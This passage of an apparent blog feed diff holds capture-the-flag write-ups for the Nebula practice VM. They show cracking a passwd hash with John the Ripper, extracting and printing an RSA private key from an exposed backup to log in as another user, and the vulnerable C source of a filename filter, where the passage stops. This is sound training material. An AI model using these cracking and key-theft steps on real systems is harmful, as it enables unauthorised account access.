+Preparing to unpack .../john-data_1.8.0-2_all.deb ...
+Unpacking john-data (1.8.0-2) ...
+Selecting previously unselected package john.
+Preparing to unpack .../john_1.8.0-2_amd64.deb ...
+Unpacking john (1.8.0-2) ...
+Processing triggers for man-db (2.7.5-1) ...
+Setting up john-data (1.8.0-2) ...
+Setting up john (1.8.0-2) ...
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;nli@mysystem:~$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ./flag06.passwd
+&lt;span class=&quot;gp&quot;&gt;nli@mysystem:~$&lt;/span&gt; john ./flag06.passwd
+&lt;span class=&quot;go&quot;&gt;Created directory: /home/nli/.john
+Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 SSE2-16])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+hello            (flag06)
+1g 0:00:00:00 100% 2/3 33.33g/s 25100p/s 25100c/s 25100C/s 123456..marley
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;nli@mysystem:~$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Amazing the password was so strong. It took me 0:00:00:00 seconds to both guess, hash my guessed password and check my hash with the provided hash. As we can see the password is “hello”. For the grand final:&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level06@nebula:~$&lt;/span&gt; ssh flag06@localhost
+&lt;span class=&quot;go&quot;&gt;The authenticity of host 'localhost (127.0.0.1)' can't be established.
+ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
+
+      _   __     __          __
+     / | / /__  / /_  __  __/ /___ _
+    /  |/ / _ \/ __ \/ / / / / __ `/
+   / /|  /  __/ /_/ / /_/ / / /_/ /
+  /_/ |_/\___/_.___/\__,_/_/\__,_/
+
+    exploit-exercises.com/nebula
+
+
+For level descriptions, please see the above URL.
+
+To log in, use the username of &quot;levelXX&quot; and password &quot;levelXX&quot;, where
+XX is the level number.
+
+Currently there are 20 levels (00 - 19).
+
+
+flag06@localhost's password:
+Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+New release '12.04 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;The programs included with the Ubuntu system are free software;&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;flag06@nebula:~$&lt;/span&gt; getflag
+&lt;span class=&quot;go&quot;&gt;You have successfully executed getflag on a target account
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;flag06@nebula:~$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If you enjoyed this tutorial then share and like!&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      
+        <author>
+            <name>Lucian Nitescu</name>
+          
+          
+        </author>
+      
+
+      
+        <category term="nebula" />
+      
+        <category term="writeups" />
+      
+
+      
+
+      
+        <summary type="html"></summary>
+      
+
+      
+      
+    </entry>
+  
+  
+  
+    <entry>
+      
+      <title type="html">Exploit Exercises: Nebula Level 05</title>
+      
+      
+      <link href="https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-05/" rel="alternate" type="text/html" title="Exploit Exercises: Nebula Level 05" />
+      
+      <published>2018-07-16T15:48:00-03:00</published>
+      <updated>2018-07-16T15:48:00-03:00</updated>
+      <id>https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-05</id>
+      <content type="html" xml:base="https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-05/">&lt;p&gt;&lt;img src=&quot;/uploads/Screenshot%20from%202018-07-16%2000-20-16.png&quot; alt=&quot;Image of Nebula Terminal&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Check the flag05 home directory. You are looking for weak directory permissions
+To do this level, log in as the level05 account with the password level05. Files for this level can be found in /home/flag05.&lt;/p&gt;
+
+&lt;h3 id=&quot;source-code&quot;&gt;Source code&lt;/h3&gt;
+
+&lt;p&gt;There is no source code available for this level.&lt;/p&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;Of course we are going to login and go to the flag account folder, but we will be surprised to see this!&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level05@nebula:/home/flag05$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;total 5
+drwxr-x--- 4 flag05 level05   93 Aug 18  2012 .
+drwxr-xr-x 1 root   root      80 Aug 27  2012 ..
+drwxr-xr-x 2 flag05 flag05    42 Nov 20  2011 .backup
+-rw-r--r-- 1 flag05 flag05   220 May 18  2011 .bash_logout
+-rw-r--r-- 1 flag05 flag05  3353 May 18  2011 .bashrc
+-rw-r--r-- 1 flag05 flag05   675 May 18  2011 .profile
+drwx------ 2 flag05 flag05    70 Nov 20  2011 .ssh
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level05@nebula:/home/flag05$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Well under our flag folder we have nothing that we can use. Nada! Yet still we have our flag straight under your nose! The best hint for this challenge is “You are looking for weak directory permissions”. So if we run this command:&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level05@nebula:/home/flag05$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-lAh&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;total 5.0K
+drwxr-xr-x 2 flag05 flag05   42 Nov 20  2011 .backup
+-rw-r--r-- 1 flag05 flag05  220 May 18  2011 .bash_logout
+-rw-r--r-- 1 flag05 flag05 3.3K May 18  2011 .bashrc
+-rw-r--r-- 1 flag05 flag05  675 May 18  2011 .profile
+drwx------ 2 flag05 flag05   70 Nov 20  2011 .ssh
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level05@nebula:/home/flag05$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Or just this:&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level05@nebula:/home/flag05$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; /home/flag05/
+&lt;span class=&quot;go&quot;&gt;total 5
+drwxr-x--- 4 flag05 level05   93 Aug 18  2012 .
+drwxr-xr-x 1 root   root      80 Aug 27  2012 ..
+drwxr-xr-x 2 flag05 flag05    42 Nov 20  2011 .backup
+-rw-r--r-- 1 flag05 flag05   220 May 18  2011 .bash_logout
+-rw-r--r-- 1 flag05 flag05  3353 May 18  2011 .bashrc
+-rw-r--r-- 1 flag05 flag05   675 May 18  2011 .profile
+drwx------ 2 flag05 flag05    70 Nov 20  2011 .ssh
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level05@nebula:/home/flag05$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We will observe a hidden folder called “.backup” with the permissions drwxr-xr-x. All fine let’s see what is in it!&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level05@nebula:/home/flag05/.backup$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-xzvf&lt;/span&gt; backup-19072011.tgz
+&lt;span class=&quot;go&quot;&gt;.ssh/
+tar: .ssh: Cannot mkdir: Permission denied
+.ssh/id_rsa.pub
+tar: .ssh: Cannot mkdir: Permission denied
+tar: .ssh/id_rsa.pub: Cannot open: No such file or directory
+.ssh/id_rsa
+tar: .ssh: Cannot mkdir: Permission denied
+tar: .ssh/id_rsa: Cannot open: No such file or directory
+.ssh/authorized_keys
+tar: .ssh: Cannot mkdir: Permission denied
+tar: .ssh/authorized_keys: Cannot open: No such file or directory
+tar: Exiting with failure status due to previous errors
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level05@nebula:/home/flag05/.backup$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;total 2
+drwxr-xr-x 2 flag05 flag05    42 Nov 20  2011 .
+drwxr-x--- 4 flag05 level05   93 Aug 18  2012 ..
+-rw-rw-r-- 1 flag05 flag05  1826 Nov 20  2011 backup-19072011.tgz
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level05@nebula:/home/flag05/.backup$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Uuuuuuuuuuuu, permission denied at “tar -xzvf backup-19072011.tgz” command! Nope. Let’s move it to another folder that we control (~/ or /tmp) and let’s unzip the tgz.&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level05@nebula:/home/flag05/.backup$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;backup-19072011.tgz ~/
+&lt;span class=&quot;gp&quot;&gt;level05@nebula:/home/flag05/.backup$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ~/
+&lt;span class=&quot;gp&quot;&gt;level05@nebula:~$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;backup-19072011.tgz
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level05@nebula:~$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;total 9
+drwxr-x--- 1 level05 level05   80 Oct 18 12:43 .
+drwxr-xr-x 1 root    root      80 Aug 27  2012 ..
+-rw-r--r-- 1 level05 level05  220 May 18  2011 .bash_logout
+-rw-r--r-- 1 level05 level05 3353 May 18  2011 .bashrc
+drwx------ 2 level05 level05   60 Oct 18 12:27 .cache
+-rw-r--r-- 1 level05 level05  675 May 18  2011 .profile
+drwx------ 2 level05 level05    3 Aug 27  2012 .ssh
+-rw-rw-r-- 1 level05 level05 1826 Oct 18 12:43 backup-19072011.tgz
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level05@nebula:~$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; ./test
+&lt;span class=&quot;gp&quot;&gt;level05@nebula:~$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-xvzf&lt;/span&gt; backup-19072011.tgz &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; ./test
+&lt;span class=&quot;go&quot;&gt;.ssh/
+.ssh/id_rsa.pub
+.ssh/id_rsa
+.ssh/authorized_keys
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level05@nebula:~$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Fun time. I’ve seen peoples trying to get the SSH key and to find the password in order to connect to the flag account in order to execute getflag to finish the task.&lt;/p&gt;
+
+&lt;p&gt;You could try this also if you want to waste your time on this task.&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level05@nebula:~/test/.ssh$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;total 12
+drwxr-xr-x 2 level05 level05  100 Jul 19  2011 .
+drwxrwxr-x 3 level05 level05   60 Oct 18 12:44 ..
+-rw-r--r-- 1 level05 level05  394 Jul 19  2011 authorized_keys
+-rw------- 1 level05 level05 1675 Jul 19  2011 id_rsa
+-rw-r--r-- 1 level05 level05  394 Jul 19  2011 id_rsa.pub
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level05@nebula:~/test/.ssh$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; ./id_rsa
+&lt;span class=&quot;go&quot;&gt;-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAywCDXFL7nGpgxuT8y8ZYyzif565M6LexECfaRFl6ECQtP2Vp
+vns4RR0HeVFpZMD2dhQQ76sXXK4Jph0/xVRgYytF1hsCJLiedJ3+aWyRMYtkgvZD
+TDDD9lYGPzsb3FLqBocxCEpYJLruISY1YdzXpYgIBEVc8Sgq8Ur1uPMHAMYOL+b3
+Hga2upWO7vBU9g91SLB6IMyje+2doO5NqmPNgNLzqsPNnv4eiFy46WMAbq9K5tP7
+txhQdRxYZwMbhnJ+CLJ0EgXUAgdkvnjlGeD5okP61Eh7lbzHiws68SkflBvcw8KA
+sMF6TSXoQECRgoi9ycwTZy4xWspUqij+sY+3EQIDAQABAoIBAAGir2w+/ufzs3Pm
+xGKf5nc8rY0gSl5VnIeUyp1iWylmITcxifiO5ZUo9rZzgXXeWB37a2eC6V1Fya4c
+7jaYx24FGzruXMYO9rfZzgLrbQAJL3YepcwnWGzTpJk90Kulv1zuGecHMk6ZcvGx
+bRysutAKmIXwSR9oQ3BOOkyTKKtI6YeKSnUNU1KVO1t//ps2wFcfXRFb17prpokx
+5clWwfUYRLBQlB4XjBIJ3tswpyC0PNOFfzoF+VeUlN9XZFrL0JWHX1F9DDOFJYL5
+bXw7zwhjEvZ0/qOvZSJiH4lkbmANsBeMNY/JOGV6T7dWthKBGehCnupeADZVaSeo
+Qlysa0ECgYEA6x4FwgpeqNtNGeCcSAUtoviTYMD5LfMEpY8t9eGdRpzw1CDlmG9x
+k1LgzE3eA0qlJYx5NNqYEefIPVLdmSuSGS/5KqHeB8Ph7+WqLmguwIIIrfRJoPaD
+ON2XqLU6YzAEazTrXnqALjOvP3qdN57xK0zoBAfYlkXJRgMYE1S23YsCgYEA3QhF
+Fl11csPc2Yyz/7+9MG9JnOckYvuir+bf3fj/HEuIC9ylwXd4GfSLAW02Sg8DlfRh
+M7MxCW9OEWtKgUtHe3fGc6/6X1yF7QfeAYZm8UX/fo6PxuX++mvfPxM4i6vRjgzB
+Qy8WisqTK9nLZO+hEdPoVqalz0iUsvu2umz0CVMCgYAsNoUWrCSI1FR3XUmGMZMX
+Zm8wbpltDpn9GCOobTjKIpEXEuiZ9bsB3T/wq2Poco0DtprEWabnFxMMlRyexRbA
+LclJPw8lnqxKFIIgH+9KvCktrRZ7cl/SvbjbPNkx9cGe92Cbb6XTCl0WLtSJtRXc
+8qVevKr59z2WMNbCK9gHaQKBgQDRaQNjpBohKFX2OytSU8uftuBMamV77iJ9e0SA
+Hmc83IbBjkPwnwrHtHt6V4lG8yCXktgAznXYFX8mW7tT8gmAfcMkWgbhEFzGbFy2
+nyqqzoG42sJ3U/KWOVtifAhns9qvNYBo8ZTu2+xBcHAWaj31EQqgBfU0BPT0+ixu
+RcmThwKBgAi0ej7ylHhtwODQGghRmDpxEx9deJ0jilM2EnqIecJj5jnPW8BKDgV4
+Dc1QljBeCQ1r30DGYmOIazbhm+orm4df6HWPayRhNBlkmulqTs5GHvLMPjcKMB0k
+0Xna7QOtBAnzoHpLcrfvBdfRNE1eC87YkPUhmm5hBgG0+TeMmWgr
+-----END RSA PRIVATE KEY-----
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level05@nebula:~/test/.ssh$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Or, you could also think that the .tgz file is called backup, so it might be the backup of this system and that it could also store the keys and passwords for ssh. In other smart words:&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level05@nebula:~/test/.ssh$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;id_rsa /home/level05/.ssh/
+&lt;span class=&quot;gp&quot;&gt;level05@nebula:~/test/.ssh$&lt;/span&gt; ssh flag05@192.168.0.101
+&lt;span class=&quot;go&quot;&gt;
+      _   __     __          __
+     / | / /__  / /_  __  __/ /___ _
+    /  |/ / _ \/ __ \/ / / / / __ `/
+   / /|  /  __/ /_/ / /_/ / / /_/ /
+  /_/ |_/\___/_.___/\__,_/_/\__,_/
+
+    exploit-exercises.com/nebula
+
+
+For level descriptions, please see the above URL.
+
+To log in, use the username of &quot;levelXX&quot; and password &quot;levelXX&quot;, where
+XX is the level number.
+
+Currently there are 20 levels (00 - 19).
+
+
+Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+New release '12.04 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;The programs included with the Ubuntu system are free software;&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;flag05@nebula:~$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;uid=994(flag05) gid=994(flag05) groups=994(flag05)
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;flag05@nebula:~$&lt;/span&gt; getflag
+&lt;span class=&quot;go&quot;&gt;You have successfully executed getflag on a target account
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;flag05@nebula:~$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Yes we do not need any password at all, just the private key of the SSH as the system knows already the system as a trusted one. Keep in mind: Be lazy!&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      
+        <author>
+            <name>Lucian Nitescu</name>
+          
+          
+        </author>
+      
+
+      
+        <category term="nebula" />
+      
+        <category term="writeups" />
+      
+
+      
+
+      
+        <summary type="html"></summary>
+      
+
+      
+      
+    </entry>
+  
+  
+  
+    <entry>
+      
+      <title type="html">Exploit Exercises: Nebula Level 04</title>
+      
+      
+      <link href="https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-04/" rel="alternate" type="text/html" title="Exploit Exercises: Nebula Level 04" />
+      
+      <published>2018-07-16T15:48:00-03:00</published>
+      <updated>2018-07-16T15:48:00-03:00</updated>
+      <id>https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-04</id>
+      <content type="html" xml:base="https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-04/">&lt;p&gt;&lt;img src=&quot;/uploads/Screenshot%20from%202018-07-16%2000-20-16.png&quot; alt=&quot;Image of Nebula Terminal&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)&lt;/p&gt;
+
+&lt;p&gt;To do this level, log in as the level04 account with the password level04. Files for this level can be found in /home/flag04.&lt;/p&gt;
+
+&lt;h3 id=&quot;source-code&quot;&gt;Source code&lt;/h3&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;sys/types.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;fcntl.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s [file to read]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strstr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;token&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;You may not access '%s'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_RDONLY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Unable to open %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+
